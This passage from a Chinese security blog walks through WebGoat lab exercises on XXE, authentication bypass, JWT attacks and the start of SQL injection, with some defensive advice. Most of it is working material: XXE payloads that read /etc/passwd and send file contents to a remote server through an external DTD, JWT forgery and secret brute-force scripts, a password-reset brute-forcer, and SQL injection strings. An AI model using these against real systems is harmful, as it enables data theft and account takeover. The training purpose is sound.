<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"http://192.168.0.100:80"</span>&gt;]&gt; <span class="comment">#探测80是否开放</span></span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"><span class="comment">#在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令</span></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"expect://ifconfig"</span> &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"><span class="comment">#这里读取系统命令ifconfig读取ip</span></span><br></pre></td></tr></table></figure>
<p><strong>基于错误的XXE注入</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地服务器保存 名为attack.dtd 的XML文件</span></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;!ENTITY %file SYSTEM <span class="string">'file:///etc/passwd'</span>&gt;</span><br><span class="line">&lt;!ENTITY %<span class="built_in">print</span> <span class="string">"&lt;!ENTITY send SYSTEM 'http://vulSite/login1.php?name=%file;'&gt;"</span>&gt;</span><br><span class="line"><span class="comment">#提交错误URI</span></span><br><span class="line">%<span class="built_in">print</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改提交XML表单</span></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE remote SYSTEM <span class="string">"http://192.168.80.2:9090/WebWolf/files/attack.dtd"</span>&gt;</span><br><span class="line">&lt;comment&gt;</span><br><span class="line">  &lt;text&gt;&amp;send;&lt;/text&gt;</span><br><span class="line">&lt;/comment&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0X04"><a href="#0X04" class="headerlink" title="0X04"></a>0X04</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE comment [&lt;!ENTITY js SYSTEM <span class="string">"file:///"</span>&gt;]&gt;</span><br><span class="line">&lt;comment&gt;  &lt;text&gt;&amp;js;&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0X07"><a href="#0X07" class="headerlink" title="0X07"></a>0X07</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /WebGoat/xxe/content-type HTTP/1.1</span><br><span class="line">Host: 192.168.80.2:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.80.2:8080/WebGoat/start.mvc</span><br><span class="line">Content-Type: application/xml			<span class="comment">#更改内容类型</span></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 111</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=0_-c6R_tWhZZx_1BDBiIpyxlcevotPdZ7ixfAYq7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> ?&gt;&lt;!DOCTYPE user [&lt;!ENTITY root SYSTEM <span class="string">"file:///"</span>&gt; ]&gt;&lt;comment&gt;&lt;text&gt;&amp;root;&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#保存为a.dtd 上传webwolf上</span></span><br><span class="line">&lt;!ENTITY % a  <span class="string">"&lt;!ENTITY attack SYSTEM 'http://127.0.0.1:9090/landing?text=%file;'&gt;"</span>&gt;</span><br><span class="line"><span class="comment">#更改提交的表单内容</span></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE comment [</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">"file:///home/webgoat/.webgoat-8.1.0//XXE/secret.txt"</span>&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">"http://192.168.80.2:9090/files/passaa/a.dtd"</span>&gt;</span><br><span class="line">%remote;</span><br><span class="line">%a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;comment&gt;&lt;text&gt;&amp;pass;&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200614232150963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>url解码得到 WebGoat 8.0 rocks… (CEsixJDQUy) 提交结果</p>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ul>
<li>设置XML解析器禁用DTD<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">XMLInputFactory xif = XMLInputFactory.newFactory();</span><br><span class="line">xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure></li>
<li>设置XML解析器禁用外部实体</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#.PHP：</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br><span class="line">#.JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">#.Python：</span><br><span class="line">from lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>
<ul>
<li>对http头中content-type及accept进行验证<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Content-Type: application/xml</span><br></pre></td></tr></table></figure></li>
<li>过滤提交数据中的&lt;!DOCTPE和&lt;!ENTITY</li>
</ul>
<blockquote>
<p>DTD语法<br><a href="https://www.cnblogs.com/lm970585581/p/7699555.html" target="_blank" rel="noopener">https://www.cnblogs.com/lm970585581/p/7699555.html</a><br>XML、XEE基础知识<br><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>Webgoat--Authentication Bypasses</title>
    <url>/2020/08/21/Webgoat--Authentication%20Bypasses/</url>
    <content><![CDATA[<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>通过html中隐藏的input标签值</p>
<p>通过移除/修改提交的参数来确认程序的响应</p>
<p>通过猜测和暴力破解强制访问站点的某些URL</p>
<h2 id="2FA-Password-Reset"><a href="#2FA-Password-Reset" class="headerlink" title="2FA Password Reset"></a>2FA Password Reset</h2><p>将secQuestion0，secQuestion1改为secQuestion2 secQuestion3即可</p>
<p><img src="https://img-blog.csdnimg.cn/20200608185814703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="JWT-（JSON-Web-tokens）"><a href="#JWT-（JSON-Web-tokens）" class="headerlink" title="JWT  （JSON Web  tokens）"></a>JWT  （JSON Web  tokens）</h2><ul>
<li><p>概念<br>一种在客户端和服务器之间使用JSON对象</p>
<p>令牌格式为Header.playload.Signature</p>
</li>
</ul>
<p>Header中存放加密的算法和类型，数据为JSON经过BASE64URL算法的编码结果<br>JSON字符串格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">"alg"</span> : <span class="string">"HS256"</span></span><br><span class="line">	<span class="string">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>playload中存放实际传递的数据（<strong>该部分非加密格式，可任意读取</strong>），数据为JSON经过BASE64URL算法的编码结果。</p>
<p>playload分三种声明（claims）：<br>Registered claims（注册声明）<br>    这些是一组预先定义的声明，它们不是强制性的，但推荐使用，以提供一组有用的，可互操作的声明。 其中一些是：iss（发行者），exp（到期时间），sub（主题），aud（受众）<br>Public claims（公开声明）<br>    由使用JWT的人员随意定义<br>Private claims（私有声明）<br>    这些是为了同意使用它们但是既没有登记，也没有公开声明的各方之间共享信息，而创建的定制声明。</p>
<p>JSON字符串格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;  	</span><br><span class="line">	<span class="string">"exp"</span>: 1416471934,  <span class="string">"user_name"</span>: <span class="string">"user"</span>,  </span><br><span class="line">	<span class="string">"scope"</span>: [    <span class="string">"read"</span>,    <span class="string">"write"</span>  ],  </span><br><span class="line">	<span class="string">"authorities"</span>: [    <span class="string">"ROLE_ADMIN"</span>,    <span class="string">"ROLE_USER"</span>  ],  </span><br><span class="line">	<span class="string">"jti"</span>: <span class="string">"9bc92a44-0b1a-4c5e-be70-da52075b9a84"</span>,  </span><br><span class="line">	<span class="string">"client_id"</span>: <span class="string">"my-client-with-secret"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Signature中存放通过secret对header和claims计算签名并经过BASE64URL算法的编码结果，算法格式为:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + <span class="string">"."</span> +base64UrlEncode(payload),secret)</span><br></pre></td></tr></table></figure>
<p>Base64URL编码与Base64类似，主要是将Base64编码中的=省略，+替换为-，/替换为_</p>
<blockquote>
<p><a href="https://www.cnblogs.com/mantoudev/p/8994341.html" target="_blank" rel="noopener">https://www.cnblogs.com/mantoudev/p/8994341.html</a></p>
</blockquote>
<h2 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>将签名算法设置为none从而绕过签名验证<br>密钥暴力破解token信息<br>利用refresh token逻辑错误，对其他账号的access token进行刷新</p>
<ul>
<li>将签名算法设置为none从而绕过签名验证<br>抓包获取Tom的JWT<br><img src="https://img-blog.csdnimg.cn/20200608202938716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问<a href="http://jwt.io" target="_blank" rel="noopener">http://jwt.io</a> 对jwt解码<br><img src="https://img-blog.csdnimg.cn/20200608201254134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把加密算法置空，把admin置为true，得到新的token<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64urlencode</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).replace(<span class="string">b'+'</span>, <span class="string">b'-'</span>).replace(<span class="string">b'/'</span>, <span class="string">b'_'</span>).replace(<span class="string">b'='</span>, <span class="string">b''</span>)</span><br><span class="line">print(b64urlencode(<span class="string">b'&#123;"alg":"none"&#125;'</span>) + <span class="string">b'.'</span> + b64urlencode(<span class="string">b'&#123;"iat":1592510350,"admin":"true","user":"Tom"&#125;'</span>) + <span class="string">b'.'</span>)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>python 中string和bytes的关系<br><a href="https://www.cnblogs.com/abclife/p/7445222.html" target="_blank" rel="noopener">https://www.cnblogs.com/abclife/p/7445222.html</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200608202909529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>暴力破解</p>
<p>可通过pyjwt 库中的 jwt.decode(jwt_str, verify=True, key=key_)破解密码<br>进行签名校验，但导致校验失败的因素不仅密钥错误，还可能是数据部分中预定义字段错误（如，当前时间超过 exp），也可能是 JWT字符串格式错误等等，所以，借助 jwt.decode(jwt_str, verify=True, key=key_) 验证密钥 key_</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.若签名直接校验失败，则 key_ 为有效密钥；</span><br><span class="line">2.若因数据部分预定义字段错误</span><br><span class="line">jwt.exceptions.ExpiredSignatureError,</span><br><span class="line">jwt.exceptions.InvalidAudienceError,</span><br><span class="line">jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">jwt.exceptions.ImmatureSignatureError</span><br><span class="line">导致校验失败，说明并非密钥错误导致，则 key_ 也为有效密钥；</span><br><span class="line">3.若因密钥错误（jwt.exceptions.InvalidSignatureError）导致校验失败，则 key_ 为无效密钥；</span><br><span class="line">4.若为其他原因（如，JWT 字符串格式错误）导致校验失败，根本无法验证当前 key_ 是否有效。</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSecret</span><span class="params">(data)</span>:</span></span><br><span class="line">    jwt_str = data</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/password.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                print(key_)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError,</span><br><span class="line">                    jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">                    jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                print(key_)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'not found'</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aW'</span> \</span><br><span class="line">              <span class="string">'xkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTU5MTcy'</span> \</span><br><span class="line">              <span class="string">'Njk2NywiZXhwIjoxNTkxNzI3MDI3LCJzdWIiOiJ0b21Ad2ViZ29h'</span> \</span><br><span class="line">              <span class="string">'dC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYX'</span> \</span><br><span class="line">              <span class="string">'Qub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJh'</span> \</span><br><span class="line">              <span class="string">'dG9yIl19.S2qEUNCr0aiq-dva_hDJT9-EO9jNe-clfl0Gm97qzxo'</span></span><br><span class="line">getSecret(data)</span><br></pre></td></tr></table></figure>
<p>生成令牌</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token_dict = &#123;</span><br><span class="line">    <span class="string">"iss"</span>: <span class="string">"WebGoat Token Builder"</span>,</span><br><span class="line">    <span class="string">"aud"</span>: <span class="string">"webgoat.org"</span>,</span><br><span class="line">    <span class="string">"iat"</span>: <span class="number">1591726967</span>,</span><br><span class="line">    <span class="string">"exp"</span>: <span class="number">9591727027</span>,</span><br><span class="line">    <span class="string">"sub"</span>: <span class="string">"tom@webgoat.org"</span>,</span><br><span class="line">    <span class="string">"username"</span>: <span class="string">"WebGoat"</span>,</span><br><span class="line">    <span class="string">"Email"</span>: <span class="string">"tom@webgoat.org"</span>,</span><br><span class="line">    <span class="string">"Role"</span>: [</span><br><span class="line">        <span class="string">"Manager"</span>,</span><br><span class="line">        <span class="string">"Project Administrator"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">key = <span class="string">"business"</span></span><br><span class="line"><span class="comment"># headers</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"typ"</span>: <span class="string">"JWT"</span>,</span><br><span class="line">    <span class="string">"alg"</span>: <span class="string">"HS512"</span>,</span><br><span class="line">&#125;</span><br><span class="line">jwt_token = jwt.encode(token_dict, key, algorithm=<span class="string">"HS512"</span>, headers=headers )</span><br><span class="line">print(jwt_token.decode())</span><br></pre></td></tr></table></figure>


<ul>
<li>刷新令牌</li>
</ul>
<p>获得刷新令牌</p>
<p><img src="https://img-blog.csdnimg.cn/20200609214932715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>刷新TOM的令牌</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"refresh_token"</span>:<span class="string">"iPVVppWFBvUXDHrCtWcw"</span>&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020060921575540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发送订单<br><img src="https://img-blog.csdnimg.cn/20200609215811695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>JWT + SQL 注入<br>当解密JWT的秘钥很多的时候，往往需要通过kid来确定使用哪个秘钥，而keyid参数通过b64加密来保存，可以被篡改。当keyid要通过数据库API拿取得时候，往往就会联想到sql 注入。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">token_dict = &#123;</span><br><span class="line">    <span class="string">"iss"</span>: <span class="string">"WebGoat Token Builder"</span>,</span><br><span class="line">    <span class="string">"aud"</span>: <span class="string">"webgoat.org"</span>,</span><br><span class="line">    <span class="string">"iat"</span>: <span class="number">1524210904</span>,</span><br><span class="line">    <span class="string">"exp"</span>: <span class="number">9591727027</span>,</span><br><span class="line">    <span class="string">"sub"</span>: <span class="string">"jerry@webgoat.com"</span>,</span><br><span class="line">    <span class="string">"username"</span>: <span class="string">"Tom"</span>,</span><br><span class="line">    <span class="string">"Email"</span>: <span class="string">"Jerry@webgoat.org"</span>,</span><br><span class="line">    <span class="string">"Role"</span>: [</span><br><span class="line">        <span class="string">"Cat"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">key = <span class="string">"pass"</span></span><br><span class="line"><span class="comment"># headers</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"typ"</span>: <span class="string">"JWT"</span>,</span><br><span class="line">    <span class="string">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">    <span class="string">"kid"</span>: <span class="string">" ' union select 'cGFzcw==' from jwt_keys where id='webgoat_key "</span></span><br><span class="line">&#125;</span><br><span class="line">jwt_token = jwt.encode(token_dict, </span><br><span class="line">                       key,</span><br><span class="line">                       algorithm=<span class="string">"HS256"</span>,  </span><br><span class="line">                       headers=headers  </span><br><span class="line">                       )</span><br><span class="line">print(jwt_token.decode())</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200613211533269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p>其他jwt利用方法<br><a href="https://4hou.win/wordpress/?p=23278" target="_blank" rel="noopener">https://4hou.win/wordpress/?p=23278</a></p>
</blockquote>
<h2 id="Password-reset"><a href="#Password-reset" class="headerlink" title="Password reset"></a>Password reset</h2><ul>
<li>0x02</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored, cprint</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">    <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'JSESSIONID'</span>: <span class="string">'2ja4uLmi1aSmefjKQIFSaxN84ZW5x_iCk62fEJDQ'</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://192.168.80.2:8080/WebGoat/PasswordReset/questions"</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"F://users.txt"</span>) <span class="keyword">as</span> users:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"F://password.txt"</span>) <span class="keyword">as</span> passwords:</span><br><span class="line">            <span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">                data = <span class="string">"username=&#123;0&#125;&amp;securityQuestion=&#123;1&#125;"</span>.format(user.strip(), password.strip())</span><br><span class="line">                res = requests.post(url=url, headers=headers, cookies=cookies, data=data)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'Congratulations'</span> <span class="keyword">in</span> res.json()[<span class="string">'feedback'</span>]:</span><br><span class="line">                    cprint(<span class="string">"name=&#123;0&#125;,password=&#123;1&#125;"</span>.format(user.strip(), password).strip(),<span class="string">'red'</span>)</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Secure-Passwords"><a href="#Secure-Passwords" class="headerlink" title="Secure Passwords"></a>Secure Passwords</h2><ul>
<li>密码设置规则<br>使用至少一个大写字母和一个特殊字符<br>无密码提示<br>没有安全性问题<br>最小8个字符</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>身份验证绕过<br>通过html中隐藏的input标签值<br>通过移除/修改提交的参数来确认程序的响应<br>通过猜测和暴力破解强制访问站点的某些URL</p>
</li>
<li><p>JWT绕过<br>将签名算法设置为none从而绕过签名验证<br>密钥暴力破解token信息<br>利用refresh token逻辑错误，对其他账号的access token进行刷新</p>
</li>
<li><p>防御方法<br>不允许出现 none 的方法：将开启 alg : none 作为一种额外的配置选项。<br>使用复杂的秘钥<br>不允许 HS256等对称加密 算法读取秘钥，将秘钥与验证算法相互匹配</p>
</li>
<li><p>密码重置<br>验证用户名/邮箱/手机号是否注册<br>暴力破解问题答案，后进行重置密码<br>通过钓鱼方式获取用户重置密码验证码或重置链接后进行重置<br>针对弱算法生成的验证码或重置链接进行暴力破解</p>
</li>
<li><p>防御方法<br>在重置密码失败3次以上，提供后端验证码生成，提示用户输入，并在后端进行验证<br>针对使用问题答案进行重置密码功能，不应限制问题答案范围<br>提供发送验证码和重置链接，选择随机性强算法，并记录验证码和用户的关系，同时需要设置验证码和重置连接的有效时间，并保证验证码和重置链接至多使用一次</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Webgoat -SQL</title>
    <url>/2020/08/21/Webgoat%20-SQL/</url>
    <content><![CDATA[<h2 id="SQL注入（简介）"><a href="#SQL注入（简介）" class="headerlink" title="SQL注入（简介）"></a>SQL注入（简介）</h2><ul>
<li>什么是SQL？</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select department from employees <span class="built_in">where</span> first_name=<span class="string">'Bob'</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>数据处理语言（DML）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update employees <span class="built_in">set</span> department=<span class="string">'Sales'</span> <span class="built_in">where</span> userid = 89762;</span><br></pre></td></tr></table></figure>

<ul>
<li>数据定义语言（DDL）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ALTER table employees add phone varchar(20);</span><br></pre></td></tr></table></figure>

<ul>
<li>数据控制语言（DCL）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Grant  &lt;权限&gt;  on  表名[(列名)]  to  用户 With  grant  option</span></span><br><span class="line"><span class="comment">#或 GRANT &lt;权限&gt; ON &lt;数据对象&gt; FROM &lt;数据库用户&gt;  </span></span><br><span class="line"></span><br><span class="line">GRANT alter TABLE TO UnauthorizedUser;</span><br></pre></td></tr></table></figure>

<ul>
<li>字符串SQL注入</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT * From user_data WHERE Login_Count = <span class="string">'1  or '</span>1<span class="string">' = '</span>1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200603233430669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>数值SQL注入</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200603235119204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>String SQL注入</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/2020060323563116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>字符串SQL注入</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">' or 1 = 1 --</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200601230447606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>数值SQL注入</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 or 1 = 1 --</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200601230748138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="SQL注入（高级）"><a href="#SQL注入（高级）" class="headerlink" title="SQL注入（高级）"></a>SQL注入（高级）</h2><ul>
<li>特殊字符<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- , <span class="comment">#     注释</span></span><br><span class="line">; 			允许执行指令链</span><br><span class="line"><span class="string">',+,||     允许字符串拼接</span></span><br></pre></td></tr></table></figure></li>
<li>联合查询</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">' ; select * from user_system_data --</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200601231718474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><ul>
<li>判断存在盲注</li>
